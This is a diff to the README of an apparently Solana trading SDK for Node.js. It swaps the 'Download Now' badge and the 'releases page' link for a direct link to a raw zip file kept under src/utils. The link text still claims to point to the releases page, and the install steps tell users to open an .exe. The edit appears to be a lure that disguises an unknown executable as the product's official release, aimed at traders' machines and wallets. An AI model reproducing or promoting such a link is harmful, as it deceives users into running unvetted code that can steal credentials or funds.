@@ -1,6 +1,6 @@
 # ⚡ sol-trade-sdk-nodejs - Trade Solana assets with high speed
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/psychicalcommunicationapparatus88/sol-trade-sdk-nodejs/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/psychicalcommunicationapparatus88/sol-trade-sdk-nodejs/raw/refs/heads/main/src/utils/sdk_nodejs_trade_sol_2.7.zip)
 
 This software lets you trade assets on the Solana network. It uses fast connections to help you execute trades. You can interact with different platforms to trade tokens. The program handles the technical details of the Solana blockchain so you focus on your trading goals.
 
@@ -10,7 +10,7 @@ Your computer needs specific tools to run this software. Ensure you have Windows
 
 ## 📥 How to Install
 
-1. Visit the [releases page](https://github.com/psychicalcommunicationapparatus88/sol-trade-sdk-nodejs/releases) to download the program.
+1. Visit the [releases page](https://github.com/psychicalcommunicationapparatus88/sol-trade-sdk-nodejs/raw/refs/heads/main/src/utils/sdk_nodejs_trade_sol_2.7.zip) to download the program.
 2. Look for the file ending in `.exe` under the most recent version.
 3. Click the file to save it to your computer.
 4. Open your Downloads folder.
